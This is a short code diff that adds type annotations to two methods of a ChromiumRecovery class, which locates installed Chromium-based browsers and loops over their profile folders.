@@ -341,7 +341,7 @@ class ChromiumRecovery(ModuleManager):
 
         return result
 
-    def installed_chromium_browsers(self):
+    def installed_chromium_browsers(self) -> list[str]:
         results = []
         for browser, path in self.browsers.items():
             if os.path.exists(path):
@@ -349,7 +349,7 @@ class ChromiumRecovery(ModuleManager):
                 self.mprint(f"Found {browser} Browser at {path}")
         return results
 
-    def run(self):
+    def run(self) -> None:
         profiles = ["Default"]
         stuff = range(1, 11)
         for i in stuff:
